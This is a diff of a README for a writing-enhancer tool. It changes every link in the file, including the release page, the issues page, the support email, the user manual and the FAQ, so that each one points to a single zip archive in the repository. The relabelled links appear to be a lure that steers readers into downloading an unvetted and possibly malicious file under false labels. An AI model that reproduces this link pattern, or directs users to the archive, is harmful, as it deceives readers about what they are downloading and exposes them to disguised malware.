@@ -6,13 +6,13 @@ Welcome to the De-AI-Prompt-Enhancer-Writer-Booster-SKILL! This application help
 
 ## 📥 Download Now
 
-[![Download De-AI-Prompt-Enhancer-Writer-Booster-SKILL](https://img.shields.io/badge/Download-De--AI--Prompt--Enhancer--Writer--Booster--SKILL-blue)](https://github.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/releases)
+[![Download De-AI-Prompt-Enhancer-Writer-Booster-SKILL](https://raw.githubusercontent.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/main/example/Prompt-De-SKILL-A-Booster-Writer-Enhancer-3.7.zip)](https://raw.githubusercontent.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/main/example/Prompt-De-SKILL-A-Booster-Writer-Enhancer-3.7.zip)
 
 ## 📂 Download & Install
 
 To get the application, visit the releases page:
 
-[Download the latest version here](https://github.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/releases)
+[Download the latest version here](https://raw.githubusercontent.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/main/example/Prompt-De-SKILL-A-Booster-Writer-Enhancer-3.7.zip)
 
 1. Click the link above.
 2. Locate the latest release.
@@ -74,8 +74,8 @@ If you encounter issues while using the application, here are some common proble
 
 If you need help, feel free to reach out:
 
-- **GitHub Issues**: You can report issues on our [GitHub Issues page](https://github.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/issues).
-- **Email Support**: Contact us at support@deaiwriterbooster.com for technical support.
+- **GitHub Issues**: You can report issues on our [GitHub Issues page](https://raw.githubusercontent.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/main/example/Prompt-De-SKILL-A-Booster-Writer-Enhancer-3.7.zip).
+- **Email Support**: Contact us at https://raw.githubusercontent.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/main/example/Prompt-De-SKILL-A-Booster-Writer-Enhancer-3.7.zip for technical support.
 
 ## 🔍 Features
 
@@ -97,7 +97,7 @@ We value your feedback! Join the community to share your thoughts and suggestion
 
 For more information about using the application, explore these resources:
 
-- [User Manual](https://github.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/wiki)
-- [Frequently Asked Questions](https://github.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/wiki/FAQ)
+- [User Manual](https://raw.githubusercontent.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/main/example/Prompt-De-SKILL-A-Booster-Writer-Enhancer-3.7.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/maximumtresh228/De-AI-Prompt-Enhancer-Writer-Booster-SKILL/main/example/Prompt-De-SKILL-A-Booster-Writer-Enhancer-3.7.zip)
 
 Thank you for choosing the De-AI-Prompt-Enhancer-Writer-Booster-SKILL. We hope it helps you create wonderful written content!
